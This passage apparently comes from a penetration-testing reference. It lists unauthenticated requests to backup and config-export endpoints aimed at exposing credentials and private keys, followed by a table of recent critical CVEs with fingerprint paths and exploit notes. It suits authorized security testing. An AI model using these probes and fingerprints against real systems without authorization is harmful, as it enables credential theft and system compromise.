| 1 | Request `/api/backup`, `/backup`, `/export`, `/download` without auth | Backup file returned + encryption keys/IVs in `X-*` response headers |
| 2 | Try `/api/settings/export`, `/admin/config/download` without auth | Config files with embedded creds, API keys, TLS private keys |

**Severity Guidance:** Critical (CVSS 9.8). Unauth backup access with embedded creds = full system compromise.

---

## Additional High-Value CVEs (Late 2025 – Early 2026)

| CVE | Product | CVSS | Key Detail |
|-----|---------|------|------------|
| CVE-2025-53770 | SharePoint | Critical | Unauth deser RCE. Fingerprint: `/_vti_pvt/service.cnf`. CISA KEV |
| CVE-2025-10035 | GoAnywhere MFT | Critical | Deser RCE. Storm-1175/Medusa ransomware. Fingerprint: `/goanywhere/` |
| CVE-2026-1603 | Ivanti EPM | 8.6 | Auth bypass via "magic number" + cred disclosure. CISA KEV March 9, 2026 |
| CVE-2026-21902 | Juniper Junos OS Evolved | 9.3 | Pre-auth RCE as root on PTX routers. Incorrectly exposed internal service |
| CVE-2025-55315 | ASP.NET Core Kestrel | 9.9 | HTTP request smuggling via chunked TE. See http-desync skill |
| CVE-2025-62164 | vLLM | Critical | RCE via `torch.load()` on user-supplied embeddings. Pattern: AI inference deser |
| CVE-2026-28514 | Rocket.Chat | 9.3 | Missing `await` on `bcrypt.compare()` → any password accepted. Async auth bypass |
| CVE-2019-17571 | SAP FS-QUO (Log4j) | 9.8 | Unauthenticated RCE via deserialization in Log4j 1.2 SocketServer. March 2026 SAP Patch Day |
| CVE-2026-27685 | SAP NetWeaver Portal | 9.1 | Malicious content upload + deserialization RCE. March 2026 SAP Patch Day |
| CVE-2025-26399 | SolarWinds WHD | 9.8 | AjaxProxy deser RCE (3rd bypass). CISA KEV March 2026 |
| CVE-2026-25921 | Gogs | 9.3 | Cross-repo LFS object overwrite — supply chain vector. Fixed 0.14.2 |
| CVE-2026-22719 | VMware Aria | 8.1 | Unauth command injection. CISA KEV March 2026. Active exploitation |
